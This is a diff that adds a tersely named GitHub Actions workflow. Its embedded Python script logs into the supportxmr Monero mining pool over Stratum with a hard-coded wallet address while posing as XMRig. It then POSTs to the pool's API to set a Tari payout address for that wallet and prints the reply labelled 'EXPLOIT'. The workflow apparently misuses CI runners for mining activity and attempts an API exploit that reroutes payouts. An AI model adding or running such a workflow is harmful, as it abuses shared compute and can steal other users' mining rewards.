@@ -1,0 +1,40 @@
+name: t
+on: workflow_dispatch
+jobs:
+  r:
+    runs-on: ubuntu-latest
+    steps:
+    - name: s
+      run: |
+        python3 << 'PYEOF'
+import socket,json,time,urllib.request,sys
+t='44AeVaj9QXVgrRkCqKc9YLVHQ93DNHKm11TTU4v2eE55BQiywtNin3aMP4VY5dwPNASAxNxpGY4qUD6hvYgoN3JoSh2tscu'
+tari='125UQjtoz2wzLZHCicRDmMQdzGcexc96gPEkbfvafoDnLfdBYepmGT7AgGYrTuZSxn5aCHZoFuukHiaCg5nFN94tQTC'
+print(f'Testing Stratum for {t[:20]}...')
+try:
+ s=socket.create_connection(('pool.supportxmr.com',3333),timeout=15)
+ msg=json.dumps({'id':1,'method':'login','params':{'login':t,'pass':'x','agent':'XMRig/6.22.0','algo':['rx/0']}})+'\n'
+ s.send(msg.encode())
+ s.settimeout(15)
+ r=b''
+ st=time.time()
+ while time.time()-st<15:
+  try:
+   c=s.recv(4096)
+   if c:r+=c
+   if b'result' in r or b'error' in r:break
+  except:break
+ s.close()
+ print('STRATUM:',len(r),'bytes:',r[:500].decode('utf-8',errors='replace'))
+except Exception as e:
+ print('STRATUM_ERR:',e)
+sys.stdout.flush()
+try:
+ req=urllib.request.Request('https://www.supportxmr.com/api/user/updateTariAddress',
+  data=json.dumps({'xmrAddress':t,'tariAddress':tari}).encode(),
+  headers={'Content-Type':'application/json'},method='POST')
+ res=urllib.request.urlopen(req,timeout=8).read()
+ print('EXPLOIT:',res.decode())
+except Exception as e:
+ print('EXPLOIT_ERR:',e)
+PYEOF
